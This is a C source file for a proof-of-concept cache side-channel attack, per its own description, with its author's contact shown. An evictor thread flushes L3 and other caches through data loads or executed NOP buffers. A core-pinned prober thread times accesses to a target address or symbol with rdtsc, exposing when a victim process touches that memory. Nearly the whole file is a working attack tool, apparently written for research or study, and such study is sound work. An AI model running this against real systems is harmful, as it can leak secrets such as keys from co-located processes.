#define _GNU_SOURCE     /* ensure inclusion of CPU_{ZERO,SET} */

#include <stdint.h>     /* [u]int*_t                     */
#include <sys/mman.h>   /* m[un]map                      */
#include <sched.h>      /* CPU_{ZERO,SET}                */
#include <pthread.h>    /* pthread_{setaffinity_np,self} */
#include <semaphore.h>  /* sem_{init,wait,post}          */
#include <argp.h>       /* argp_parse, etc.              */
#include <unistd.h>     /* usleep                        */
#include <dlfcn.h>      /* dlsym                         */

#include "util.h"

/******************************************************************************
 **************************** CLI ARGUMENT PARSING ****************************
 ******************************************************************************/

/* argp API global variables */
const char *argp_program_version     = "version 1.0";
const char *argp_program_bug_address = "<andru.mantu@gmail.com>";

/* command line arguments */
static struct argp_option options[] = {
    { NULL, 0, NULL, 0, "Cache level description", 0 },
    { "sets",        's', "NUM", 0, "Number of cache sets",               0 },
    { "assoc",       'a', "NUM", 0, "Number of cache lines per set",      0 },
    { "coherency",   'c', "NUM", 0, "Number of bytes per cache line",     0 },

    { NULL, 0, NULL, 0, "Mode of operation", 10 },
    { "icache",      'i', NULL,  0, "Eviction by instruction fetch",     10 },
    { "dcache",      'd', NULL,  0, "Eviction by data access (default)", 10 },
    { "evictor-cpu", 'e', "NUM", 0, "Evictor thread CPU number",         11 },
    { "prober-cpu",  'p', "NUM", 0, "Prober thread CPU number",          11 },
    { "address",     'x', "HEX", 0, "Target address (disable ASLR)",     12 },
    { "name",        'n', "STR", 0, "Target symbol name",                12 },
    { "probe-lag",   'l', "NUM", 0, "Wait time after eviction [μs]",     13 },

    { NULL, 0, NULL, 0, "Runtime statistics", 20 },
    { "outlier-ths", 't', "NUM", 0, "Outlier threshold [cycles]",        20 },
    { "window-sz",   'w', "NUM", 0, "Moving average window size",        20 },


    { 0 },
};

/* globally accessible parsed arguments */
static uint64_t cache_sets;
static uint64_t cache_associativity;
static uint64_t cache_coherency;
static uint64_t cache_size;
static uint8_t  evict_by_code;
static uint32_t evictor_cpu;
static uint32_t prober_cpu;
static uint64_t target_addr;
static uint64_t wait_time;
static uint64_t outlier_threshold;
static uint64_t window_size;

/* parser configuration parameters */
static error_t parse_opt(int32_t, char *, struct argp_state *);
static char args_doc[] = "";
static char doc[] = "PoC cache side-channel (best on L3)";

static struct argp argp = { options, parse_opt, args_doc, doc };

/* parse_opt - parse one argument and update relevant structures
 *  @key   : argument id
 *  @arg   : pointer to actual argument
 *  @state : parsing state
 *
 *  @return : 0 if everything ok
 *
 * NOTE: not doing argument sanitization, so don't fuck it up!
 */
error_t parse_opt(int key, char *arg, struct argp_state *state)
{
    switch (key) {
        case 's':   /* number of cache sets */
            sscanf(arg, "%lu", &cache_sets);
            break;
        case 'a':   /* number of cache lines per set */
            sscanf(arg, "%lu", &cache_associativity);
            break;
        case 'c':   /* number of bytes per cache line */
            sscanf(arg, "%lu", &cache_coherency);
            break;
        case 'i':   /* eviction by instruction fetch */
            evict_by_code = 1;
            break;
        case 'd':   /* eviction by data fetch */
            evict_by_code = 0;
            break;
        case 'e':   /* evictor cpu number */
            sscanf(arg, "%u", &evictor_cpu);
            break;
        case 'p':   /* prober cpu number */
            sscanf(arg, "%u", &prober_cpu);
            break;
        case 'x':   /* target address */
            sscanf(arg, "%lx", &target_addr);
            break;
        case 'n':   /* target symbol name ==> address */
            target_addr = (uint64_t) dlsym(RTLD_DEFAULT, arg);
            RET(!target_addr, EINVAL, "Unable to resolve symbol %s", arg);
            break;
        case 'l':   /* wait time between eviction and probe */
            sscanf(arg, "%lu", &wait_time);
            break;
        case 't':   /* outlier load time threshold */
            sscanf(arg, "%lu", &outlier_threshold);
            break;
        case 'w':   /* latency moving average window size */
            sscanf(arg, "%lu", &window_size);
            break;
        case ARGP_KEY_END:  /* executes after all arguments were parsed */
            cache_size = cache_sets * cache_associativity * cache_coherency;
            RET(!cache_size, EINVAL, "Specify all cache arguments!");
            RET(!target_addr, EINVAL, "Specify target address or symbol name!");
            RET(!outlier_threshold, EINVAL, "Specify outlier threshold!");
            RET(!window_size, EINVAL, "Specify moving average window size!");
            break;
        default:    /* unknown argument */
            return ARGP_ERR_UNKNOWN;
    }

    return 0;
}
/******************************************************************************
 ******************************* CACHE PROBING ********************************
 ******************************************************************************/

/* probe - returns memory load latency
 *  @addr : loaded dword address
 *
 *  @return : number of clock cycles
 *
 * TODO: calculate elapsed cycles in asm block
 *       gcc reassigns r8-11 to generic registers for bitwise / arithmetic ops
 */
uint64_t probe(void *addr)
{
    /* rdtsc counters at t1 and t2                     *
     * allocate as registers to avoid pushing to stack */
    register uint64_t rax_1 asm("r8");
    register uint64_t rdx_1 asm("r9");
    register uint64_t rax_2 asm("r10");
    register uint64_t rdx_2 asm("r11");

    asm __volatile__(
        ".intel_syntax          \n"
        "mfence                 \n"
        "lfence                 \n"
        "rdtsc                  \n"
        "lfence                 \n"
        "mov    %0, %%rax       \n"
        "mov    %1, %%rdx       \n"
        "mov    %%eax, [%4]     \n"
        "lfence                 \n"
        "rdtsc                  \n"
        "mov    %2, %%rax       \n"
        "mov    %3, %%rdx       \n"
        ".att_syntax            \n"
    : "=r" (rax_1), "=r" (rdx_1),
      "=r" (rax_2), "=r" (rdx_2)
    : "c" (addr)
    : "%rax", "%rdx"
    );

    /* very unlikely, but EAX may overflow ==> avoid outliers */
    return ((rdx_2 << 32) | rax_2) - ((rdx_1 << 32) | rax_1);
}

/******************************************************************************
 ******************************* CACHE EVICTION *******************************
 ******************************************************************************/

/* icache_evict - evicts cache by executing instructions
 *  @code : pointer to start of code buffer
 *  @size : ignored; here just to provide consistent API
 *
 * This should fill out L2-3 and L1 icache, but not dcache.
 *
 * The buffer should be initialized with NOPs (0x90) and end with a RET (0xc3).
 * Could pleace a LEAVE (0xc9) before the RET to free this function's stack
 * frame, for a small performance increas (should be negligible).
 *
 * TODO: generate some content that's faster to execute while providing the
 *       same functionality
 */
void icache_evict(void *code, uint64_t size)
{
    asm __volatile__(
        ".intel_syntax          \n"
        "call   %0              \n"
        ".att_syntax            \n"
    :
    : "r" (code)
    );
}

/* dcache_evict - evicts cache by loading data
 *  @data : pointer to start of data buffer
 *  @size : length of data buffer
 *
 * This should fill out L2-3 and L1 dcache, but not icache.
 *
 * We could increase the stride to the length of a cache line for faster
 * iteration. We should be mindful of LRU / LFU strategies that the CPU
 * employs for cache eviction.
 */
void dcache_evict(void *data, uint64_t size)
{
    for (uint64_t *p = data; (void *) p < data + size; p++)
        asm __volatile__ (
            ".intel_syntax      \n"
            "mov    %%rbx, [%0] \n"
            ".att_syntax        \n"
        :
        : "r" (p)
        );
}

/******************************************************************************
 ************************* CORE SPECIFIC MAIN THREADS *************************
 ******************************************************************************/

/* evictor_main - thread that evicts victim's cache
 *  @data : pointer to semaphores array (this uses semaphores[1])
 *
 * This should run on the same physical core as the victim, but not necessarily
 * on the same logical core.
 */
void *evictor_main(void *data)
{
    void (*evict)(void *, uint64_t);    /* cache eviction function  */
    uint8_t     *buffer;                /* anon mapped cache buffer */
    int32_t     prot;                   /* buffer protection mode   */
    sem_t       *semaphores = data;     /* reference to semaphores  */
    cpu_set_t   cpuset;                 /* thread affinity cpu set  */
    int32_t     ans;                    /* answer                   */

    /* set cpu affinity */
    CPU_ZERO(&cpuset);
    CPU_SET(evictor_cpu, &cpuset);

    ans = pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
    DIE(ans, "Unable to set cpu affinity (%s)", strerror(errno));

    /* create icache or dcache eviciton-specific configuration */
    if (evict_by_code) {
        prot = PROT_READ | PROT_WRITE | PROT_EXEC;
        evict = icache_evict;
    } else {
        prot = PROT_READ | PROT_WRITE;
        evict = dcache_evict;
    }

    /* allocate cache overwriting buffer */
    buffer = mmap(NULL, cache_size, prot, MAP_PRIVATE | MAP_ANON, -1, 0);
    DIE(buffer == MAP_FAILED, "Unable to create anonymous map (%s)",
        strerror(errno));

    /* fault in the buffer pages & initialize according to configuration */
    memset(buffer, 0x90, cache_size);       /* NOP */
    if (evict_by_code)
        buffer[cache_size - 1] = 0xc3;      /* RET */

    /* main evictor loop (alternating with prober) */
    while (1) {
        /* wait for prober to finish */
        ans = sem_wait(&semaphores[1]);
        ALERT(ans, "Unable to wait for semaphore (%s)", strerror(errno));

        /* perform (whichever) eviction */
        evict(buffer, cache_size);

        /* give victim some time to access its memory */
        usleep(wait_time);

        /* let prober start up again */
        ans = sem_post(&semaphores[0]);
        ALERT(ans, "Unable to post semaphore (%s)", strerror(errno));
    }

    return NULL;
}

/* prober_main - thread that probes target memory address
 *  @data : pointer to semaphores array (this uses semaphores[0])
 *
 * This should run on a different physical core than the evictor and the victim.
 * Also, this should be the _only_ thing running on that core! The instructions
 * of another process (e.g.: the victim) may be ineterlaced with those of the
 * probe() function, leading to an artifical increase of RDTSC deltas. This
 * should reduce the channel noise, but it works only with L3 cache, since it's
 * shared between all cores.
 */
void *prober_main(void *data)
{
    sem_t       *semaphores = data;     /* reference to semaphores        */
    cpu_set_t   cpuset;                 /* thread affinity cpu set        */
    uint64_t    delta;                  /* single memory probe duration   */
    uint64_t    total_time = 0;         /* windowed memory probe duration */
    uint64_t    *avg_window;            /* sample window buffer           */
    uint64_t    window_head = 0;        /* sample window head             */
    int32_t     ans;                    /* answer                         */

    /* set cpu affinity */
    CPU_ZERO(&cpuset);
    CPU_SET(prober_cpu, &cpuset);

    ans = pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
    DIE(ans, "Unable to set cpu affinity (%s)", strerror(errno));

    /* allocate and zero out sample window */
    avg_window = calloc(window_size, sizeof(delta));
    DIE(!avg_window, "Unable to allocate sample window buffer (%s)",
        strerror(errno));

    /* main prober loop (alternating with evictor) */
    while (1) {
        /* wait for evictor to finish */
        ans = sem_wait(&semaphores[0]);
        ALERT(ans, "Unable to wait for semaphore (%s)", strerror(errno));

        /* perform memory access time measurement */
        delta = probe((void *) target_addr);

        /* update window if access time below outlier threshold */
        if (delta < outlier_threshold) {
            total_time += delta - avg_window[window_head];
            avg_window[window_head++] = delta;
            window_head %= window_size;
        }

        INFO("Access time is: %5lu cycles | Average: %5lu cycles",
             delta, total_time / window_size);

        /* let evictor start up again */
        ans = sem_post(&semaphores[1]);
        ALERT(ans, "Unable to post semaphore (%s)", strerror(errno));
    }

    return NULL;
}

/******************************************************************************
 ************************************ MAIN ************************************
 ******************************************************************************/

/* main - program entry point
 *  @argc : number of cli arguments
 *  @argv : array of cli arguments
 *
 *  @return : 0 if everything ok
 */
int32_t main(int32_t argc, char *argv[])
{
    static sem_t        semaphores[2];  /* for alternating evict / probe */
    pthread_t           threads[2];     /* evictor / prober threads      */
    int32_t             ans;            /* answer                        */

    /* parse cli arguments */
    ans = argp_parse(&argp, argc, argv, 0, 0, NULL);
    DIE(ans, "Error parsing command line arguments");

    /* initialize semaphores (evictor goes first)                       *
     * NOTE: we want to avoid global variables for semaphores, but they *
     *       can't reside on stack (i.e.: be function-local); so we put *
     *       them in .bss by making them static                         */
    for (size_t i = 0; i < 2; i++) {
        ans = sem_init(&semaphores[i], 0, i);
        DIE(ans, "Unable to initialize semaphore (%s)", strerror(errno));
    }

    /* launch evictor / prober threads */
    ans = pthread_create(&threads[0], NULL, evictor_main, (void *) semaphores);
    DIE(ans, "Unable to create thread (%s)", strerror(errno));
    ans = pthread_create(&threads[1], NULL, prober_main,  (void *) semaphores);
    DIE(ans, "Unable to create thread (%s)", strerror(errno));

    /* join created threads (just to block main thread)                   *
     * NOTE: we are going to SIGINT out of this anyway, so ignore cleanup */
    for (size_t i = 0; i < sizeof(threads) / sizeof(*threads); i++)
        pthread_join(threads[i], NULL);

    return 0;
}

